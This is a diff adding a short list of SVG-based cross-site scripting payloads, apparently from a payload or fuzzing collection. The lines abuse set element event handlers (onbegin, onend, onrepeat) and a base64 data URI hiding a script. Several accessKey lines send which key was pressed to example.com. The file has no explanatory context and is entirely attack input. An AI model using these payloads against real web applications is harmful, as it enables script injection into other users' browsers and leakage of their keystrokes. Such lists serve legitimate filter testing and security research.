@@ -1,0 +1,9 @@
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onend=alert(1) attributename=x dur=1s>
+<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+<set attributeName="onmouseover" to="alert(89)"/>
+<feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage>
+<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
